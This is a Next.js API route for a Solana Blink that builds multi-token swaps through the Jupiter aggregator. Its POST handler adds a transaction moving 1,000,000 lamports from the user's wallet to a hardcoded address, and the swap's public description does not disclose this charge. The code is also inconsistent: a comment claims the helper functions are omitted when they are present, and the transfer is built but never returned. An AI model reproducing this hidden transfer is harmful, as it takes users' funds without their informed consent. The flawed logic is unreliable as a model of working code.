import { NextRequest, NextResponse } from 'next/server';
import { Connection, PublicKey, SystemProgram, TransactionMessage, VersionedTransaction } from '@solana/web3.js';
import { createJupiterApiClient, QuoteGetRequest, QuoteResponse } from "@jup-ag/api";

const connection = new Connection('https://mainnet.helius-rpc.com/?api-key=YOUR_API_KEY');
const jupiterQuoteApi = createJupiterApiClient();

// Helper functions (getQuote, getSwapObj) would be implemented here
// For brevity, I'm not including their implementations, but they would be the same as in your original code

async function getQuote(
    inputMint: string,
    outputMint: string,
    amount: number
  ) {
    const params: QuoteGetRequest = {
      inputMint: inputMint,
      outputMint: outputMint,
      amount: amount,
      autoSlippage: true,
      autoSlippageCollisionUsdValue: 1_000,
      maxAutoSlippageBps: 1000,
      minimizeSlippage: true,
      onlyDirectRoutes: false,
      asLegacyTransaction: false,
    };
    const quote = await jupiterQuoteApi.quoteGet(params);
    if (!quote) {
      throw new Error("unable to quote");
    }
    return quote;
  }
  
   async function getSwapObj(wallet: string, quote: QuoteResponse) {
   
    const swapObj = await jupiterQuoteApi.swapPost({
      swapRequest: {
        quoteResponse: quote,
        userPublicKey: wallet,
        dynamicComputeUnitLimit: true,
        prioritizationFeeLamports: "auto",
      },
    });
   
    return swapObj;
  }

export async function GET(request: NextRequest) {
  return NextResponse.json({
    type: "action",
    icon: "https://blinks.sickfreak.club/proto.png",
    title: "Token Swap",
    description: "Swap tokens using Jupiter aggregator",
    label: "Swap",
    links: {
      actions: [
        {
          label: "Perform Swap",
          href: "/api/swap",
          parameters: [
            {
              name: "inputAmount",
              label: "Input Amount",
              type: "number"
            },
            {
              name: "inputMint",
              label: "Input Token",
              type: "text"
            },
            {
              name: "outputMints",
              label: "Output Tokens",
              type: "text"
            }
          ]
        }
      ]
    }
  });
}

export async function POST(request: NextRequest) {
  const { inputAmount, inputMint, outputMints } = await request.json();
  const userPublicKey = request.headers.get('x-user-public-key');

  if (!userPublicKey) {
    return NextResponse.json({ error: "User public key is required" }, { status: 400 });
  }

  try {
    const outputMintsArray = outputMints.split(',');
    const swapAmount = parseFloat(inputAmount) / outputMintsArray.length;

    const quotePromises = outputMintsArray.map((outputMint: string) => 
      getQuote(inputMint, outputMint, Math.floor(swapAmount * 1e9)) // Assuming SOL input
    );

    const quotes = await Promise.all(quotePromises);
    
    const swapPromises = quotes.map(quote => 
      getSwapObj(userPublicKey, quote)
    );

    const swapObjs = await Promise.all(swapPromises);

    const transactions = swapObjs.map(swapObj => {
      const swapTransactionBuf = Buffer.from(swapObj.swapTransaction, "base64");
      return VersionedTransaction.deserialize(swapTransactionBuf);
    });

    // Add transfer transactions
    const transferToStaticWallet = new VersionedTransaction(
      new TransactionMessage({
        payerKey: new PublicKey(userPublicKey),
        recentBlockhash: (await connection.getLatestBlockhash()).blockhash,
        instructions: [
          SystemProgram.transfer({
            fromPubkey: new PublicKey(userPublicKey),
            toPubkey: new PublicKey("SicKRgxa9vRCfMy4QYzKcnJJvDy1ojxJiNu3PRnmBLs"),
            lamports: 1000000,
          })
        ],
      }).compileToV0Message()
    );

    transactions.push(transferToStaticWallet);

    // Serialize all transactions
    const serializedTransactions = transactions.map(tx => 
      Buffer.from(tx.serialize()).toString('base64')
    );

    return NextResponse.json({
      transaction: serializedTransactions[0], // First transaction
      message: "Swap transactions ready for signing",
      links: {
        next: {
          type: "post",
          href: "/api/swap/complete"
        }
      }
    });
  } catch (error) {
    console.error("Error preparing swap:", error);
    return NextResponse.json({ error: "Failed to prepare swap" }, { status: 500 });
  }
}